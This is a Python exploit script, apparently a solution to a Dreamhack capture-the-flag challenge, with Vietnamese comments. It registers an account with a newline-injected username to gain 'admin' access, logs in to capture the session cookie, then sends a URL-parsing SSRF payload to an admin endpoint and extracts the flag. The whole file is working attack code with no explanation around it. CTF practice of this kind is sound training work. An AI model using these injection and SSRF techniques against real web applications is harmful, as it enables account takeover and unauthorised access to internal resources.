import re
import requests

class Exploit:
    def __init__(self, baseURL):
        self.baseURL = baseURL.rstrip("/")
        self.admin_token = None
        # payload đăng ký bypass newline
        self.signup_payload = "username=\nadmin&password=a"
        self.new_username = "admin"
        self.password = "a"
        self.payload = "http@0/dreamhack.io/{.}./fla{g}"
        self.session = requests.Session()

    def sign_up(self):
        headers = {
            "Content-Type": "application/x-www-form-urlencoded"
        }
        response = self.session.post(
            f"{self.baseURL}/signup",
            data=self.signup_payload.encode(),  
            headers=headers,
            allow_redirects=False,
            timeout=5
        )
        if response.status_code in (200, 302):
            print(f"[+] Đăng ký bypass newline thành công")
            return True
        else:
            print(f"[-] Đăng ký bypass thất bại ({response.status_code})")
            return False

    def login(self):
        data = {
            "username": self.new_username,
            "password": self.password
        }
        response = self.session.post(
            f"{self.baseURL}/login",
            data=data,
            allow_redirects=False,
            timeout=5
        )
        self.admin_token = self.session.cookies.get("session")
        if not self.admin_token:
            print(f"[-] Đăng nhập thất bại không có token")
        else:
            print(f"[+] Admin Cookie Token: {self.admin_token}\n")

    def ssrf_get_flag(self):
        if not self.admin_token:
            print("[-] Chưa có session cookie, hãy login trước.")
            return
        r = self.session.post(
            f"{self.baseURL}/admin",
            data={"url": self.payload},  
            allow_redirects=False,
            timeout=10
        )
        m = re.search(r"(DH\{.*?\})", r.text or "", re.DOTALL)
        if m:
            print("[+] DONE FLAG HERE:", m.group(1))
        else:
            print("[-] Failed FLAG")
if __name__ == "__main__":
    BASE_URL = "http://host8.dreamhack.games:16376"
    exploit = Exploit(BASE_URL)
    exploit.sign_up()
    exploit.login()
    exploit.ssrf_get_flag()
